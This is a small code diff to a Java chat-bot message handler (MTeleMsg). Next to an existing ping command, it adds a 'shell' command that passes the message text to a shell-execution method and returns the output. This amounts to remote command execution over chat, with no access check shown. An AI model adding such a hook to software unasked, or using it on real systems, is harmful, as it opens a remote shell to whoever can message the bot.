@@ -107,6 +107,9 @@ public class MTeleMsg {
 
 			case "doping":
 				return MPing.ping(t.getMessageRaw(1)).toString();
+			case "shell":
+				return MWipf.shell(t.getMessageFullDataOnly());
+
 			default:
 				break;
 			}
